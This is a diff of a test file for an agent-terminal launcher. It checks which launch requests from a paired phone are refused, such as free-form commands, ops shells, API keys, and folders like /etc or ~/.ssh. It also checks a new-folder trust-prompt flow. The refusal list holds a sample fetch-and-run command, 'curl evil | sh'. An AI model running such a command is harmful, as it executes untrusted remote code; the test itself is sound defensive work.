@@ -19,6 +19,7 @@ vi.mock('../server/db.js', () => ({
 const pty = vi.hoisted(() => ({
   owner: new Map<string, string>(),
   created: [] as Array<{ command: string; workingDir: string }>,
+  autoConfirmTrust: [] as Array<boolean | undefined>,
   fg: new Map<string, string>(),
   write: vi.fn(),
   n: 0,
@@ -27,8 +28,9 @@ vi.mock('../server/sshManager.js', async (importOriginal) => {
   const actual = await importOriginal<typeof import('../server/sshManager.js')>();
   return {
     ...actual,
-    createTerminal: vi.fn(async (config: { command: string; workingDir: string }) => {
+    createTerminal: vi.fn(async (config: { command: string; workingDir: string; autoConfirmTrust?: boolean }) => {
       pty.created.push({ command: config.command, workingDir: config.workingDir });
+      pty.autoConfirmTrust.push(config.autoConfirmTrust);
       return `term-phone-${++pty.n}`;
     }),
     writeWhenReady: vi.fn(),
@@ -315,15 +317,16 @@ describe('phoneLaunchRefusal', () => {
   it('refuses folders outside the home folder or in agent config, even when listed', () => {
     const listed = [outside, join(home, '.codex', 'proj'), join(home, 'Library', 'proj')];
     for (const dir of listed) {
-      expect(phoneLaunchRefusal({ workingDir: dir, command: 'claude' }, listed, home), dir).toMatch(/known project/);
+      expect(phoneLaunchRefusal({ workingDir: dir, command: 'claude' }, listed, home), dir).toMatch(/inside your home folder/);
     }
     expect(phoneLaunchRefusal({ workingDir: join(home, 'code', 'library'), command: 'claude' }, [join(home, 'code', 'library')], home)).toBeNull();
   });
 
-  it('refuses a folder outside the list, and the home folder even when listed', () => {
-    expect(phoneLaunchRefusal({ workingDir: other, command: 'claude' }, allowed(), home)).toMatch(/known project/);
-    expect(phoneLaunchRefusal({ workingDir: home, command: 'claude' }, allowed(), home)).toMatch(/known project/);
-    expect(phoneLaunchRefusal({ workingDir: join(project, '..', 'other'), command: 'claude' }, allowed(), home)).toMatch(/known project/);
+  // AASC-54: a folder outside the list is a new folder (the phone confirms it first); home never qualifies.
+  it('starts in an unlisted folder under home, but never the home folder, even when listed', () => {
+    expect(phoneLaunchRefusal({ workingDir: other, command: 'claude' }, allowed(), home)).toBeNull();
+    expect(phoneLaunchRefusal({ workingDir: join(project, '..', 'other'), command: 'claude' }, allowed(), home)).toBeNull();
+    expect(phoneLaunchRefusal({ workingDir: home, command: 'claude' }, allowed(), home)).toMatch(/not the home folder itself/);
   });
 });
 
@@ -465,12 +468,19 @@ describe('a paired phone through the API', () => {
     expect(pty.created).toEqual([]);
   });
 
-  it('can’t start a free-form command, an ops shell or a session outside known projects', async () => {
+  it('can’t start a free-form command, an ops shell or a session outside the home folder or in a private folder', async () => {
     const refused = [
       { workingDir: project, command: '', startupCommand: 'curl evil | sh' },
       { workingDir: project, command: 'bash' },
       { workingDir: project, command: 'claude', enableOpsTerminal: true },
+      { workingDir: project, command: 'claude', apiKey: 'sk-x' },
+      { workingDir: project, command: 'claude', remoteControlName: 'phone' },
       { workingDir: join(tmp, 'elsewhere'), command: 'claude' },
+      { workingDir: outside, command: 'claude' },
+      { workingDir: '/etc', command: 'codex' },
+      { workingDir: join(home, '.ssh'), command: 'claude' },
+      { workingDir: join(project, 'keys'), command: 'claude' }, // a link to ~/.ssh
+      { workingDir: join(project, 'README.md'), command: 'claude' },
       { workingDir: home, command: 'claude' },
     ];
     for (const body of refused) {
@@ -490,6 +500,39 @@ describe('a paired phone through the API', () => {
     // The card keeps the flag when Claude's first hook re-keys it.
     await store.handleEvent({ session_id: 'phone-launched-uuid', hook_event_name: 'SessionStart', agent_terminal_id: id, cwd: launchDir, tty_path: '/dev/ttys901' } as never);
     expect(store.getSession('phone-launched-uuid')?.remoteVisible).toBe(true);
+  });
+
+  // AASC-54: a folder no agent has used yet (the phone asked "Start in a new folder?" first).
+  it('starts claude and codex in a never-used folder, shared with it, in the folder it checked', async () => {
+    const fresh = join(home, 'brand-new');
+    mkdirSync(fresh, { recursive: true });
+    for (const command of ['claude', 'codex']) {
+      pty.created.length = 0;
+      pty.autoConfirmTrust.length = 0;
+      const res = await call('POST', '/terminals', PHONE, { workingDir: '~/brand-new', command, forceNew: true });
+      expect(res.status, command).toBe(200);
+      expect(pty.created, command).toEqual([{ command, workingDir: fresh }]);
+      expect(store.getSession(String(res.json.terminalId))?.remoteVisible, command).toBe(true);
+      // Its folder-trust prompt is the phone's to answer: the dashboard doesn't confirm it,
+      // and the session keeps that for a restart, resume or fork (they relaunch from sshConfig).
+      expect(pty.autoConfirmTrust, command).toEqual([false]);
+      expect(store.getSession(String(res.json.terminalId))?.sshConfig?.autoConfirmTrust, command).toBe(false);
+    }
+  });
+
+  it('keeps confirming Claude’s trust prompt in a known project, and never falls back to home for a gone folder', async () => {
+    pty.autoConfirmTrust.length = 0;
+    expect((await call('POST', '/terminals', PHONE, { workingDir: launchDir, command: 'claude', forceNew: true })).status).toBe(200);
+    expect(pty.autoConfirmTrust).toEqual([undefined]);
+    pty.autoConfirmTrust.length = 0;
+    expect((await call('POST', '/terminals', {}, { workingDir: join(home, 'brand-new'), command: 'claude', forceNew: true })).status).toBe(200);
+    expect(pty.autoConfirmTrust).toEqual([undefined]); // the Mac's own launch: unchanged
+  });
+
+  it('starts the Mac’s own launch in a new folder hidden from remote devices', async () => {
+    const res = await call('POST', '/terminals', {}, { workingDir: other, command: 'claude', forceNew: true });
+    expect(res.status).toBe(200);
+    expect(store.getSession(String(res.json.terminalId))?.remoteVisible).not.toBe(true);
   });
 
   it('is never handed a hidden session as the one already running there', async () => {
